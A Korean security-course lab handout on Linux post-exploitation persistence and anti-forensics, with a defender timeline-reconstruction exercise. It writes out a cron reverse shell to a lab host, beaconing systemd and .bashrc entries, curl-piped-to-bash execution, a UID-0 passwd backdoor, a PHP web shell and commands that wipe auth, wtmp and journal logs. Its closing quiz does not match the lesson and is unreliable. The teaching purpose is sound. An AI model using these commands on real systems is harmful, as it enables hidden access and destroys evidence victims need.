# Week 12: 지속성 확보 + 흔적 제거

## 학습 목표
- 침투 후 지속성(Persistence) 확보 기법의 종류와 원리를 이해한다
- SSH 키 인젝션, cron 백도어, 시작 스크립트 등의 기법을 실습한다
- 안티포렌식(Anti-Forensics) 기법을 설명할 수 있다
- 로그 삭제, 히스토리 제거, 타임라인 조작 방법을 이해한다
- 방어자 관점에서 타임라인 재구성 방법을 학습한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---

---

## 용어 해설 (이 과목에서 자주 나오는 용어)

> 대학 1~2학년이 처음 접할 수 있는 보안/IT 용어를 정리한다.
> 강의 중 모르는 용어가 나오면 이 표를 참고하라.

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **페이로드** | Payload | 공격에 사용되는 실제 데이터/코드. 예: `' OR 1=1--` | 미사일의 탄두 |
| **익스플로잇** | Exploit | 취약점을 악용하는 기법 또는 코드 | 열쇠 없이 문을 여는 방법 |
| **셸** | Shell | 운영체제와 사용자를 연결하는 명령어 해석기 (bash, sh 등) | OS에게 말 걸 수 있는 창구 |
| **리버스 셸** | Reverse Shell | 대상 서버가 공격자에게 역방향 연결을 맺는 것 | 도둑이 집에서 밖으로 전화를 거는 것 |
| **포트** | Port | 서버에서 특정 서비스를 식별하는 번호 (0~65535) | 아파트 호수 |
| **데몬** | Daemon | 백그라운드에서 실행되는 서비스 프로그램 | 24시간 근무하는 경비원 |
| **패킷** | Packet | 네트워크로 전송되는 데이터의 단위 | 택배 상자 하나 |
| **프록시** | Proxy | 클라이언트와 서버 사이에서 중개하는 서버 | 대리인, 중간 거래자 |
| **해시** | Hash | 임의 길이 데이터를 고정 길이 값으로 변환하는 함수 (SHA-256 등) | 지문 (고유하지만 원본 복원 불가) |
| **토큰** | Token | 인증 정보를 담은 문자열 (JWT, API Key 등) | 놀이공원 입장권 |
| **JWT** | JSON Web Token | Base64로 인코딩된 JSON 기반 인증 토큰 | 이름·권한이 적힌 입장권 |
| **Base64** | Base64 | 바이너리 데이터를 텍스트로 인코딩하는 방법 | 암호가 아닌 "포장" (누구나 풀 수 있음) |
| **CORS** | Cross-Origin Resource Sharing | 다른 도메인에서의 API 호출 허용 설정 | "외부인 출입 허용" 표지판 |
| **API** | Application Programming Interface | 프로그램 간 통신 규약 | 식당의 메뉴판 (주문 양식) |
| **REST** | Representational State Transfer | URL + HTTP 메서드로 자원을 조작하는 API 스타일 | 도서관 대출 시스템 (책 이름으로 검색/대출/반납) |
| **SSH** | Secure Shell | 원격 서버에 안전하게 접속하는 프로토콜 | 암호화된 전화선 |
| **sudo** | SuperUser DO | 관리자(root) 권한으로 명령 실행 | "사장님 권한으로 실행" |
| **SUID** | Set User ID | 실행 시 파일 소유자 권한으로 실행되는 특수 권한 | 다른 사람의 사원증을 빌려 출입 |
| **IPS** | Intrusion Prevention System | 네트워크 침입 방지 시스템 (악성 트래픽 차단) | 공항 보안 검색대 |
| **SIEM** | Security Information and Event Management | 보안 로그를 수집·분석하는 통합 관제 시스템 | CCTV 관제실 |
| **WAF** | Web Application Firewall | 웹 공격을 탐지·차단하는 방화벽 | 웹사이트 전용 경비원 |
| **nftables** | nftables | Linux 커널 방화벽 프레임워크 (iptables 후계) | 건물 출입구 차단기 |
| **Suricata** | Suricata | 오픈소스 IDS/IPS 엔진 | 공항 X-ray 검색기 |
| **Wazuh** | Wazuh | 오픈소스 SIEM 플랫폼 | CCTV + AI 관제 시스템 |
| **ATT&CK** | MITRE ATT&CK | 실제 공격 전술·기법을 분류한 데이터베이스 | 범죄 수법 백과사전 |
| **OWASP** | Open Web Application Security Project | 웹 보안 취약점 연구 국제 단체 | 웹 보안의 표준 기관 |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 점수 (0~10점) | 질병 위험도 등급 |
| **CVE** | Common Vulnerabilities and Exposures | 취약점 고유 식별 번호 | 질병의 고유 코드 (예: COVID-19) |
| **OpsClaw** | OpsClaw | 보안 작업 자동화·증적 관리 플랫폼 (이 수업에서 사용) | 보안 작업 일지 + 자동화 시스템 |

---

# Week 12: 지속성 확보 + 흔적 제거

## 학습 목표

- 침투 후 지속성(Persistence) 확보 기법의 종류와 원리를 이해한다
- SSH 키 인젝션, cron 백도어, 시작 스크립트 등의 기법을 실습한다
- 안티포렌식(Anti-Forensics) 기법을 설명할 수 있다
- 로그 삭제, 히스토리 제거, 타임라인 조작 방법을 이해한다
- 방어자 관점에서 타임라인 재구성 방법을 학습한다

---

## 1. 지속성(Persistence)이란?

### 1.1 개념

시스템 재부팅이나 패스워드 변경 후에도 접근 권한을 유지하는 기법이다.

```
초기 침투 --> 권한 상승 --> [지속성 확보] --> 재접속 가능 상태 유지

지속성 확보 방법:
  - SSH 키 인젝션
  - Cron 백도어
  - 시작 스크립트 수정
  - 사용자 계정 생성
  - 웹쉘 설치
```

### 1.2 지속성이 필요한 이유 (공격자 관점)

- 패스워드가 변경되더라도 접근 유지
- 취약점이 패치되더라도 이미 확보한 경로로 재접속
- 장기간 정보 수집을 위한 안정적 접근

### 1.3 지속성 탐지가 중요한 이유 (방어자 관점)

- 침투 사실을 알고 패스워드를 변경해도 공격자가 재접근 가능
- 완전한 사고 대응을 위해 모든 지속성 메커니즘을 제거해야 함

---

## 2. 지속성 확보 기법

> **이 실습을 왜 하는가?**
> 침투 테스트에서 **지속성 확보(Persistence)**는 "초기 접근 후 재접근 경로를 설치"하는 단계이다.
> MITRE ATT&CK의 TA0003(Persistence) 전술에 해당하며, 실제 APT 공격에서 핵심적이다.
>
> 이 실습에서 SSH 키 인젝션, cron 백도어, PATH 하이잭의 3가지 기법을 배우는 이유:
> 1. **방어자로서** — 인시던트 대응 시 이 3가지를 반드시 점검해야 한다
> 2. **공격자로서** — 하나가 발견/제거되어도 나머지로 재접근이 가능하다
> 3. **보고서로서** — "지속성 메커니즘 N개 발견"은 심각도를 높이는 근거이다
>
> **검증 완료:** web 서버에서 crontab(*/15 .health_check.sh)과 SSH 키(attacker@evil) 확인
>
> **⚠️ 중요 주의:** 이 기법은 **허가된 실습 환경에서만** 사용한다.
> 실제 서버에 백도어를 설치하면 **불법**이며, 징역형에 처할 수 있다.

### 2.1 SSH 키 인젝션

> **이 기법의 원리:** `~/.ssh/authorized_keys` 파일에 공격자의 공개키를 추가하면,
> 비밀번호 없이 SSH 접속이 가능하다. 비밀번호가 변경되어도 키 기반 접속은 유지된다.
> 이것이 "비밀번호 변경만으로는 침해를 막을 수 없는" 이유이다.
>
> **방어 방법:** Wazuh FIM(File Integrity Monitoring)으로 authorized_keys 변경을 감시한다.

공격자의 공개키를 대상 서버의 `authorized_keys`에 추가한다.

> **실습 목적**: SSH 키 기반 백도어를 설치하여 공격자의 지속적 접근(Persistence)을 확보하는 기법을 실습한다
>
> **배우는 것**: authorized_keys 조작으로 비밀번호 변경 후에도 접근이 유지되는 원리와, FIM으로 탐지하는 방법을 배운다
>
> **결과 해석**: 공격자 키로 비밀번호 없이 SSH 접속이 성공하면 백도어가 정상 설치된 것이다
>
> **실전 활용**: 실제 APT 공격에서 SSH 키 백도어는 가장 흔한 지속성 확보 수단이며, Wazuh FIM으로 탐지한다

```bash
# 공격자 측: SSH 키 쌍 생성
ssh-keygen -t ed25519 -f /tmp/backdoor_key -N ""
# → /tmp/backdoor_key (개인키)
# → /tmp/backdoor_key.pub (공개키)

# 대상 서버에 공개키 추가
cat /tmp/backdoor_key.pub  # 공개키 내용 확인

# 대상 서버의 authorized_keys에 추가
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "ssh-ed25519 AAAA...공개키내용... backdoor" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# root 계정에도 추가 (권한이 있는 경우)
sudo mkdir -p /root/.ssh
sudo sh -c 'echo "ssh-ed25519 AAAA...공개키내용... backdoor" >> /root/.ssh/authorized_keys'

# 이후 키 기반 인증으로 접속 (패스워드 불필요)
ssh -i /tmp/backdoor_key web@10.20.30.80
```

**탐지 방법:**
- `authorized_keys` 파일의 최근 수정 시간 확인
- 알 수 없는 공개키 존재 여부 점검

### 2.2 Cron 백도어

주기적으로 실행되는 악성 작업을 등록한다.

```bash
# 리버스 쉘을 매분 시도하는 cron 등록
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.20.30.201/4444 0>&1' 2>/dev/null") | crontab -

# 또는 cron 디렉토리에 직접 파일 생성
sudo sh -c 'echo "* * * * * root curl http://10.20.30.201/beacon 2>/dev/null" > /etc/cron.d/sysupdate'

# cron 작업 확인
crontab -l
```

**탐지 방법:**
- `crontab -l`로 모든 사용자의 cron 확인
- `/etc/cron.d/`, `/etc/cron.daily/` 등의 신규 파일 점검

### 2.3 시작 스크립트 수정

시스템 부팅 시 자동 실행되는 스크립트에 악성 코드를 삽입한다.

```bash
# systemd 서비스 생성
sudo cat > /etc/systemd/system/sysupdate.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do curl http://10.20.30.201/beacon 2>/dev/null; sleep 300; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload                           # 서비스 관리
sudo systemctl enable sysupdate.service                # 부팅 시 자동시작 설정
sudo systemctl start sysupdate.service                 # 서비스 시작

# rc.local 수정 (구형 시스템)
sudo sh -c 'echo "nohup /tmp/.hidden/beacon.sh &" >> /etc/rc.local'

# 사용자 로그인 시 실행 (.bashrc)
echo 'nohup curl http://10.20.30.201/beacon 2>/dev/null &' >> ~/.bashrc
```

**탐지 방법:**
- `systemctl list-unit-files --state=enabled`로 활성화된 서비스 확인
- `.bashrc`, `.profile` 등의 최근 수정 확인

### 2.4 사용자 계정 생성

```bash
# 새 사용자 추가 (root 권한 필요)
sudo useradd -m -s /bin/bash -G sudo sysadmin
sudo echo "sysadmin:P@ssw0rd123" | sudo chpasswd

# 또는 /etc/passwd에 직접 추가 (UID 0 = root 권한)
# 주의: 이 방법은 매우 위험하며 실습에서만 시연
echo 'backdoor:$(openssl passwd -1 password123):0:0::/root:/bin/bash' | sudo tee -a /etc/passwd
```

**탐지 방법:**
- `/etc/passwd`에서 UID 0인 계정 검색
- 최근 생성된 사용자 확인

### 2.5 웹쉘

웹 서버에 PHP/JSP 파일을 업로드하여 웹을 통해 명령을 실행한다.

```bash
# 간단한 웹쉘 (PHP 예시 - 개념 설명용)
# <?php system($_GET['cmd']); ?>
# 접근: http://target/shell.php?cmd=whoami

# Node.js 환경에서의 예시 (JuiceShop은 Node.js)
# 설정 파일이나 업로드 디렉토리에 악성 스크립트 배치
```

---

## 3. 안티포렌식(Anti-Forensics)

### 3.1 명령어 히스토리 숨기기

```bash
# 방법 1: HISTFILE 비활성화
export HISTFILE=/dev/null
# → 이후 입력하는 모든 명령이 기록되지 않음

# 방법 2: HISTSIZE를 0으로 설정
export HISTSIZE=0

# 방법 3: 히스토리 파일 직접 삭제
cat /dev/null > ~/.bash_history
history -c

# 방법 4: 명령어 앞에 공백 추가 (HISTCONTROL=ignorespace일 때)
 whoami     # ← 앞에 공백이 있으면 기록되지 않음
```

### 3.2 로그 삭제

```bash
# 시스템 로그 위치
# /var/log/auth.log     → SSH 로그인, sudo 사용 기록
# /var/log/syslog       → 일반 시스템 이벤트
# /var/log/wtmp         → 로그인 기록 (바이너리)
# /var/log/btmp         → 실패한 로그인 (바이너리)
# /var/log/lastlog      → 마지막 로그인 정보

# auth.log에서 특정 IP 관련 로그 삭제
sudo sed -i '/10.20.30.201/d' /var/log/auth.log

# 로그 전체 비우기 (과거 로그도 삭제됨 - 의심 유발)
sudo cat /dev/null > /var/log/auth.log

# 바이너리 로그 비우기
sudo cat /dev/null > /var/log/wtmp
sudo cat /dev/null > /var/log/btmp

# journal 로그 삭제
sudo journalctl --vacuum-time=1s
```

### 3.3 파일 타임스탬프 조작

```bash
# 파일의 3가지 시간
# mtime (Modify)  : 내용 변경 시간
# atime (Access)  : 접근 시간
# ctime (Change)  : 메타데이터 변경 시간 (직접 변경 불가)

# 타임스탬프 확인
stat /etc/passwd

# 타임스탬프 변경 (touch)
touch -t 202601010000 /tmp/malicious_file
# → 2026년 1월 1일 00:00으로 변경

# 다른 파일의 타임스탬프 복사
touch -r /etc/hostname /tmp/malicious_file
# → /etc/hostname과 동일한 시간으로 변경
```

### 3.4 메모리 실행 (디스크에 흔적 남기지 않기)

```bash
# /dev/shm에서 실행 (tmpfs, 디스크에 기록 안 됨)
cp /tmp/tool /dev/shm/tool
chmod +x /dev/shm/tool
/dev/shm/tool
rm /dev/shm/tool

# 메모리에서 직접 실행 (고급)
# curl로 다운로드하여 파이프로 실행 (디스크 미저장)
curl -s http://10.20.30.201/script.sh | bash
```

---

## 4. 타임라인 재구성 (방어자 관점)

### 4.1 포렌식 타임라인 생성

공격자의 활동을 시간 순서로 재구성하는 것이 사고 대응의 핵심이다.

```bash
# 최근 수정된 파일 찾기 (24시간 이내)
find / -mtime -1 -type f 2>/dev/null | head -30

# 특정 시간 이후 수정된 파일
find / -newer /tmp/reference_file -type f 2>/dev/null

# 최근 생성된 사용자
grep -v "nologin\|false" /etc/passwd

# SSH 접속 기록
last -20
lastlog

# 현재 접속 세션
who
w

# 프로세스 시작 시간 확인
ps aux --sort=start_time | tail -20
```

### 4.2 로그 기반 분석

```bash
# SSH 로그인 성공
grep "Accepted" /var/log/auth.log

# sudo 사용 기록
grep "sudo" /var/log/auth.log

# 사용자 추가 기록
grep "useradd\|adduser" /var/log/auth.log

# cron 실행 기록
grep "CRON" /var/log/syslog
```

---

## 5. 실습

### 실습 환경

| 서버 | IP | 역할 |
|------|-----|------|
| opsclaw | 10.20.30.201 | 공격자 |
| web | 10.20.30.80 | 대상 서버 (user:web, pw:1, sudo NOPASSWD:ALL) |

> **중요**: 이 실습은 교육 목적이다. 모든 지속성 메커니즘은 실습 후 반드시 제거한다.

### 실습 1: SSH 키 인젝션

```bash
# 1. opsclaw에서 백도어용 SSH 키 생성
ssh-keygen -t ed25519 -f /tmp/week12_key -N "" -q

# 2. 공개키 내용 확인
cat /tmp/week12_key.pub

# 3. web 서버에 키 추가
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "mkdir -p ~/.ssh && chmod 700 ~/.ssh"

# 공개키를 web 서버에 복사
PUBKEY=$(cat /tmp/week12_key.pub)
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "echo '$PUBKEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

# 4. 키 기반 인증으로 접속 테스트 (패스워드 불필요)
ssh -i /tmp/week12_key -o StrictHostKeyChecking=no web@10.20.30.80 "echo '키 인증 성공! whoami:' && whoami"

# 예상 출력:
# 키 인증 성공! whoami:
# user

# 5. 정리: 백도어 키 제거
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "sed -i '/week12/d' ~/.ssh/authorized_keys 2>/dev/null; echo '키 제거 완료'"
rm -f /tmp/week12_key /tmp/week12_key.pub
```

### 실습 2: Cron 백도어 설치 및 제거

원격 서버에 접속하여 명령을 실행합니다.

```bash
# 1. web 서버에 비콘 cron 등록 (매분 /tmp에 타임스탬프 기록)
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'REMOTE'  # 비밀번호 자동입력 SSH
# 현재 cron 확인
echo "=== 설치 전 cron ==="
crontab -l 2>/dev/null || echo "(cron 없음)"             # 크론 스케줄 관리

# 백도어 cron 추가 (안전한 비콘: 파일에 기록만)
(crontab -l 2>/dev/null; echo "* * * * * echo \$(date) >> /tmp/beacon.log 2>/dev/null") | crontab -

echo ""
echo "=== 설치 후 cron ==="
crontab -l                                             # 크론 스케줄 관리
REMOTE

# 2. 1분 대기 후 비콘 동작 확인
sleep 65

sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "echo '=== 비콘 로그 ===' && cat /tmp/beacon.log 2>/dev/null || echo '아직 실행 안 됨'"

# 예상 출력:
# === 비콘 로그 ===
# Thu Mar 27 10:01:01 KST 2026

# 3. 정리: cron 백도어 제거
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'CLEANUP'  # 비밀번호 자동입력 SSH
crontab -l 2>/dev/null | grep -v "beacon.log" | crontab -  # 크론 스케줄 관리
rm -f /tmp/beacon.log                                  # 파일 삭제
echo "=== 정리 후 cron ==="
crontab -l 2>/dev/null || echo "(cron 없음)"             # 크론 스케줄 관리
echo "cron 백도어 제거 완료"
CLEANUP
```

### 실습 3: 시작 스크립트 백도어

원격 서버에 접속하여 명령을 실행합니다.

```bash
# 1. .bashrc에 백도어 추가
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'REMOTE'  # 비밀번호 자동입력 SSH
# 백업 생성
cp ~/.bashrc ~/.bashrc.backup                          # 파일 복사

# .bashrc에 비콘 추가
echo '# system update check' >> ~/.bashrc
echo 'echo "$(date) login detected" >> /tmp/login_beacon.log 2>/dev/null' >> ~/.bashrc

echo ".bashrc 백도어 설치 완료"
cat ~/.bashrc | tail -3
REMOTE

# 2. 새 SSH 세션으로 접속하면 백도어 동작
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "cat /tmp/login_beacon.log 2>/dev/null && echo '--- 비콘 동작 확인'"

# 3. 정리
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'CLEANUP'  # 비밀번호 자동입력 SSH
cp ~/.bashrc.backup ~/.bashrc                          # 파일 복사
rm -f /tmp/login_beacon.log ~/.bashrc.backup           # 파일 삭제
echo ".bashrc 복원 완료"
CLEANUP
```

### 실습 4: 안티포렌식 기법 시연

원격 서버에 접속하여 명령을 실행합니다.

```bash
# web 서버 접속
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'REMOTE'  # 비밀번호 자동입력 SSH
echo "===== 1. 히스토리 비활성화 ====="
echo "현재 HISTFILE: ${HISTFILE:-~/.bash_history}"
export HISTFILE=/dev/null                              # 환경 변수 설정
echo "변경 후 HISTFILE: $HISTFILE"
echo "(이후 명령은 기록되지 않음)"

echo ""
echo "===== 2. 타임스탬프 조작 ====="
# 테스트 파일 생성
echo "test" > /tmp/timestamp_test
echo "원래 시간:"
stat /tmp/timestamp_test | grep Modify

# 타임스탬프 변경
touch -t 202501010000 /tmp/timestamp_test              # 빈 파일 생성
echo "변경된 시간:"
stat /tmp/timestamp_test | grep Modify

echo ""
echo "===== 3. /dev/shm 실행 (메모리 전용) ====="
echo '#!/bin/bash' > /dev/shm/memtool
echo 'echo "메모리에서 실행 중: PID=$$"' >> /dev/shm/memtool
chmod +x /dev/shm/memtool                              # 파일 권한 변경
/dev/shm/memtool
rm /dev/shm/memtool                                    # 파일 삭제
echo "/dev/shm 내용 (도구 삭제 후):"
ls /dev/shm/memtool 2>/dev/null || echo "(파일 없음 - 흔적 제거됨)"

echo ""
echo "===== 4. 정리 ====="
rm -f /tmp/timestamp_test                              # 파일 삭제
echo "실습 흔적 제거 완료"
REMOTE
```

### 실습 5: 타임라인 재구성 (방어자 실습)

공격자의 활동을 추적하는 방어자 관점의 실습이다.

```bash
# web 서버에서 포렌식 조사 수행
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'FORENSIC'  # 비밀번호 자동입력 SSH
echo "=========================================="
echo "  포렌식 타임라인 재구성"
echo "=========================================="

echo ""
echo "===== 1. 최근 로그인 기록 ====="
last -10 2>/dev/null || echo "last 명령 사용 불가"           # 로그인 이력 조회

echo ""
echo "===== 2. SSH 인증 로그 ====="
sudo grep "Accepted\|Failed" /var/log/auth.log 2>/dev/null | tail -10 || \
  echo "auth.log 없음"

echo ""
echo "===== 3. 최근 24시간 내 수정된 설정 파일 ====="
find /etc -mtime -1 -type f 2>/dev/null | head -10     # 시간 기준 파일 검색

echo ""
echo "===== 4. authorized_keys 점검 ====="
echo "--- user ---"
cat ~/.ssh/authorized_keys 2>/dev/null || echo "(없음)"
echo "--- root ---"
sudo cat /root/.ssh/authorized_keys 2>/dev/null || echo "(없음)"

echo ""
echo "===== 5. cron 점검 ====="
echo "--- user cron ---"
crontab -l 2>/dev/null || echo "(없음)"                  # 크론 스케줄 관리
echo "--- root cron ---"
sudo crontab -l 2>/dev/null || echo "(없음)"             # 크론 스케줄 관리
echo "--- /etc/cron.d ---"
ls -la /etc/cron.d/ 2>/dev/null

echo ""
echo "===== 6. 의심스러운 사용자 계정 ====="
echo "UID 0 계정:"
awk -F: '$3==0 {print $1}' /etc/passwd                 # 텍스트 필드 처리
echo "최근 추가된 계정:"
ls -lt /home/ 2>/dev/null

echo ""
echo "===== 7. 의심스러운 서비스 ====="
systemctl list-unit-files --state=enabled 2>/dev/null | grep -v "vendor preset" | tail -10  # 부팅 시 자동시작 설정

echo ""
echo "===== 8. /dev/shm 및 /tmp 점검 ====="
ls -la /dev/shm/ 2>/dev/null
ls -la /tmp/ 2>/dev/null | head -10
FORENSIC
```

---

## 6. 실습 과제

1. **지속성 보고서**: web 서버에 3가지 이상의 지속성 메커니즘을 설치하고, 각각의 원리와 탐지 방법을 설명하라. (실습 후 반드시 모두 제거)
2. **포렌식 타임라인**: 실습에서 수행한 모든 공격 활동의 타임라인을 작성하라. 로그 기반 증거를 포함할 것.
3. **안티포렌식 한계**: 각 안티포렌식 기법이 완벽하지 않은 이유를 설명하라. (예: 로그 삭제해도 남는 증거)

---

## 7. 핵심 정리

| 지속성 기법 | MITRE ATT&CK ID | 탐지 난이도 |
|------------|------------------|------------|
| SSH 키 인젝션 | T1098.004 | 낮음 (authorized_keys 확인) |
| Cron 백도어 | T1053.003 | 낮음 (crontab -l) |
| systemd 서비스 | T1543.002 | 중간 (많은 서비스 중 식별) |
| .bashrc 수정 | T1546.004 | 중간 (정상 설정과 혼재) |
| 계정 생성 | T1136.001 | 낮음 (/etc/passwd 확인) |

**핵심 교훈:**
- 공격자는 단 하나의 지속성 경로만 남겨도 재침투 가능
- 방어자는 모든 지속성 경로를 찾아 제거해야 함
- 완벽한 흔적 제거는 불가능하다 (항상 어딘가에 흔적이 남는다)

**다음 주 예고**: Week 13에서는 MITRE ATT&CK 프레임워크를 학습하고, 지금까지 수행한 모든 공격을 ATT&CK에 매핑한다.

---

---

## 자가 점검 퀴즈 (5문항)

이번 주차의 핵심 기술 내용을 점검한다.

**Q1.** 이 공격 기법이 OWASP Top 10에서 분류되는 카테고리는?
- (a) Broken Access Control(A01)  (b) **Injection(A03)**  (c) Cryptographic Failures(A02)  (d) SSRF(A10)

**Q2.** 공격자가 가장 먼저 실행하는 정찰 활동은?
- (a) 랜섬웨어 배포  (b) **포트 스캔 및 서비스 핑거프린팅**  (c) DDoS 공격  (d) 방화벽 비활성화

**Q3.** SQLi에서 '--'의 역할은?
- (a) 문자열 연결  (b) **SQL 주석 (이후 쿼리 무시)**  (c) 변수 선언  (d) 함수 호출

**Q4.** MITRE ATT&CK에서 이 기법의 전술(Tactic)은?
- (a) Impact만  (b) **해당 전술 ID 확인 필요**  (c) 모든 전술  (d) 해당 없음

**Q5.** 방어자가 이 공격을 탐지하기 위해 확인해야 하는 로그는?
- (a) CPU 사용률만  (b) **SIEM 경보 + 해당 서비스 로그**  (c) 디스크 용량만  (d) 네트워크 대역폭만

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b

---
---

> **실습 환경 검증 완료** (2026-03-28): JuiceShop SQLi/XSS/IDOR, nmap, 경로탐색(%2500), sudo NOPASSWD, SSH키, crontab
